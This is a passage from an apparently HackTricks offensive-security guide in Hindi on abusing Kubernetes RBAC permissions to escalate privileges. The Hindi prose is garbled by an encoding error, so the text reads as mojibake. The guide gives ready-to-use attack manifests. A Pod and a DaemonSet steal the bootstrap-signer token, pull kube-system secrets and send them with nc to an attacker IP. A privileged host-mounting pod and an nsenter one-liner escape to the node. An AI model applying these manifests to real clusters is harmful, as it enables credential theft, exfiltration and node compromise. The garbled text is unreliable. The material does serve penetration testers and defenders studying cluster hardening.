# Kubernetes рдореЗрдВ Roles/ClusterRoles рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

рдпрд╣рд╛рдБ рдХреБрдЫ рд╕рдВрднрд╛рд╡рд┐рдд рдЦрддрд░рдирд╛рдХ Roles рдФрд░ ClusterRoles рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдЖрдк рд╕рднреА рд╕рдорд░реНрдерд┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ `kubectl api-resources` рдХреЗ рд╕рд╛рде рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐**

рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рднреАрддрд░ **рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ** рдХреЗ рд╕рд╛рде **рдПрдХ рдЕрд▓рдЧ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓** рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХрд▓рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрджрд░реНрднрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдХubernetes рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рднреАрддрд░ рдпрд╛ рдмрд╛рд╣рд░реА рдХреНрд▓рд╛рдЙрдб рдХреЗ рд▓рд┐рдП) рдЬреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реИрдВ, Kubernetes рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдореВрд▓ рд░реВрдк рд╕реЗ **4 рдореБрдЦреНрдп рддрдХрдиреАрдХреЗрдВ** рд╣реИрдВ:

* рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рд╕рдореВрд╣/SA рдХреЛ **рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ kubernetes рдХреНрд▓рд╕реНрдЯрд░ рдпрд╛ рдмрд╛рд╣рд░реА рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдмреЗрд╣рддрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВ
* **рдкреЙрдбреНрд╕ рдмрдирд╛рдирд╛/рдкреИрдЪ рдХрд░рдирд╛/рдХрд╛рд░реНрдпрдХреНрд░рдо рдЪрд▓рд╛рдирд╛** рдЬрд╣рд╛рдБ рдЖрдк **рдмреЗрд╣рддрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ SAs** рдХреЛ рдЦреЛрдЬ рдпрд╛ рд╕рдВрд▓рдЧреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ kubernetes рдХреНрд▓рд╕реНрдЯрд░ рдпрд╛ рдмрд╛рд╣рд░реА рдХреНрд▓рд╛рдЙрдб рдореЗрдВ
* **рдЧреБрдкреНрдд рдкрдврд╝рдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдХреНрдпреЛрдВрдХрд┐ SAs рдЯреЛрдХрди рдЧреБрдкреНрдд рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ
* рдПрдХ рдХрдВрдЯреЗрдирд░ рд╕реЗ **рдиреЛрдб рдкрд░ рднрд╛рдЧрдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛, рдЬрд╣рд╛рдБ рдЖрдк рдиреЛрдб рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд╕рднреА рдЧреБрдкреНрдд, рдиреЛрдб рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдФрд░ рдиреЛрдб рдХреЗ рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдЪрд▓рдиреЗ рдХреЗ рджреМрд░рд╛рди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдпрджрд┐ рдХреЛрдИ рд╣реЛ)
* рдПрдХ рдкрд╛рдВрдЪрд╡реАрдВ рддрдХрдиреАрдХ рдЬрд┐рд╕рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рд╡рд╣ рд╣реИ **рдкреЙрдб рдореЗрдВ рдкреЛрд░реНрдЯ-рдлреЙрд░рд╡рд░реНрдб** рдЪрд▓рд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛, рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдЙрд╕ рдкреЙрдб рдХреЗ рднреАрддрд░ рджрд┐рд▓рдЪрд╕реНрдк рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдпрд╛ рдХреНрд░рд┐рдпрд╛ (рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб) рддрдХ рдкрд╣реБрдБрдЪ

**рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб (\*) рдХрд┐рд╕реА рднреА рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдкрд░ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ ClusterRole рдХреЗ рднреАрддрд░ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рдХрд┐рд╕реА рднреАnamespace рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рддрдХ рдкрд╣реБрдБрдЪреЗрдВ

RBAC рдореЗрдВ, рдХреБрдЫ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬреЛрдЦрд┐рдо рдкреНрд░рд╕реНрддреБрдд рдХрд░рддреА рд╣реИрдВ:

1. **`create`:** рдХрд┐рд╕реА рднреА рдХреНрд▓рд╕реНрдЯрд░ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдмрдирд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХрд╛ рдЬреЛрдЦрд┐рдо рд╣реЛрддрд╛ рд╣реИред
2. **`list`:** рд╕рднреА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
3. **`get`:** рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рд╕реЗ рд░рд╣рд╕реНрдпреЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдЦрддрд░рд╛ рд╣реИред
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдПрдХ рдкреЛрдб рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ рдкреЛрдб рдореЗрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рд╕рдВрд▓рдЧреНрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреА рдкрд╣рдЪрд╛рди рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЛрдХрди рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИред рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдЗрд╕рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдирд╛

`bootstrap-signer` рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХрд╛ рдЯреЛрдХрди рдЪреБрд░рд╛рдиреЗ рдФрд░ рдЗрд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рднреЗрдЬрдиреЗ рд╡рд╛рд▓реЗ рдкреЛрдб рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Create & Escape

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рднреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдХрдВрдЯреЗрдирд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

* **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдкрд╣реБрдВрдЪ** (рд╕реБрд░рдХреНрд╖рд╛рдУрдВ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рдФрд░ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рд╕реЗрдЯ рдХрд░рдирд╛)
* **hostIPC рдФрд░ hostPid рдирд╛рдорд╕реНрдерд╛рди рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ** рдЬреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* **hostNetwork** рдирд╛рдорд╕реНрдерд╛рди рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ, рдЬреЛ рдиреЛрдбреНрд╕ рдХреЗ рдХреНрд▓рд╛рдЙрдб рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЪреБрд░рд╛рдиреЗ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рддрдХ рдмреЗрд╣рддрд░ рдкрд╣реБрдВрдЪ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ
* **рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╣реЛрд╕реНрдЯреНрд╕ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

рдкреЙрдб рдмрдирд╛рдПрдВ:
```bash
kubectl --token $token create -f mount_root.yaml
```
рдПрдХ рд▓рд╛рдЗрдирд░ [рдЗрд╕ рдЯреНрд╡реАрдЯ](https://twitter.com/mauilion/status/1129468485480751104) рд╕реЗ рдФрд░ рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рдХреЗ рд╕рд╛рде:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
рдЕрдм рдЬрдм рдЖрдк рдиреЛрдб рдкрд░ рднрд╛рдЧ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рддрдХрдиреАрдХреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

#### Stealth

рдЖрдк рд╢рд╛рдпрдж **stealthier** рд╣реЛрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЕрдЧрд▓реЗ рдкреГрд╖реНрдареЛрдВ рдкрд░ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдкрд┐рдЫрд▓реЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдХреЗ рдПрдХ рдкреЙрдб рдмрдирд╛рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдХреНрдпрд╛ рдПрдХреНрд╕реЗрд╕ рдХрд░ рдкрд╛рдПрдВрдЧреЗ:

* **Privileged + hostPID**
* **Privileged only**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_рдЖрдк рдкрд┐рдЫрд▓реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдкреЙрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдмрдирд╛рдиреЗ/рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдЙрджрд╛рд╣рд░рдг [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред_

### Pod Create - Move to cloud

рдпрджрд┐ рдЖрдк **create** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдПрдХ **pod** (рдФрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ рдПрдХ **service account**) рддреЛ рдЖрдк **cloud environment рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ** рдПрдХ рдкреЙрдб рдпрд╛ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЛ **cloud roles рд╕реМрдВрдкрдХрд░** рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдХреЗред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдк **host network namespace** рдХреЗ рд╕рд╛рде рдПрдХ **pod** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **node** рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА IAM рднреВрдорд┐рдХрд╛ **рдЪреБрд░рд╛** рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs**

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХ рдирдпрд╛ рдкреЙрдб** рдмрдирд╛рдирд╛ рдФрд░ рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдХреА рддрд░рд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд yaml **рдПрдХ рдбреЗрдордирд╕реЗрдЯ рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ SA рдХрд╛ рдЯреЛрдХрди рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИ:**
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** рдХреНрдпреВрдмреЗрд░рдиреЗрдЯреНрд╕ рдореЗрдВ рдПрдХ рд╕рдВрд╕рд╛рдзрди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╢реЗрд▓ рдореЗрдВ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ **рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ рдпрд╛ рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдПрдХ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рдЬрд╛рдПрдВ рдФрд░ SA рдХрд╛ рдЯреЛрдХрди рдЪреБрд░рд╛ рд▓реЗрдВ**, рдпрд╛ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдкреЙрдб рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░реЗрдВ, рдиреЛрдб рдкрд░ рднрд╛рдЧреЗрдВ, рдФрд░ рдиреЛрдб рдореЗрдВ рд╕рднреА рдкреЙрдбреНрд╕ рдХреЗ рдЯреЛрдХрди рдЪреБрд░рд╛ рд▓реЗрдВ рдФрд░ (ab)node рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

рдпрд╣ рдЕрдиреБрдорддрд┐ **рдПрдХ рд╕реНрдерд╛рдиреАрдп рдкреЛрд░реНрдЯ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкреЙрдб рдореЗрдВ рдПрдХ рдкреЛрд░реНрдЯ рдкрд░ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЗрд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рдЪрд▓ рд░рд╣реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдбрд┐рдмрдЧ рдХрд░рдирд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рджрд┐рд▓рдЪрд╕реНрдк (рдЬреИрд╕реЗ DBs) рдпрд╛ рдХрдордЬреЛрд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ (рд╡реЗрдм?) рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рд╢реЛрдз рдореЗрдВ рд╕рдВрдХреЗрддрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), рдпрджрд┐ рдЖрдк рдПрдХ рдкреЙрдб рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдПрдХ рдкреЙрдб рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ **рд╣реЛрд╕реНрдЯ рдХрд╛ `/var/log/` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдорд╛рдЙрдВрдЯ рдХреА рдЧрдИ рд╣реИ**, рддреЛ рдЖрдк **рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рдЗрд╕ рдХрд╛рд░рдг рд╣реИ рдХрд┐ рдЬрдм **Kube-API рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рд▓реЙрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `kubectl logs <pod>` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП), рддреЛ рдпрд╣ **рдкреЙрдб рдХреЗ `0.log`** рдлрд╝рд╛рдЗрд▓ рдХреЛ **Kubelet** рд╕реЗрд╡рд╛ рдХреЗ `/logs/` рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред\
Kubelet рд╕реЗрд╡рд╛ `/logs/` рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддреА рд╣реИ рдЬреЛ рдореВрд▓ рд░реВрдк рд╕реЗ **рдХрдВрдЯреЗрдирд░ рдХреЗ `/var/log` рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдгрд╛рд▓реА рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд░рд╣реА рд╣реИ**ред

рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **рдХрдВрдЯреЗрдирд░ рдХреЗ /var/log/ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдкрд╣реБрдБрдЪ рд╣реИ** рд╡рд╣ рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ 2 рддрд░реАрдХреЛрдВ рд╕реЗ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

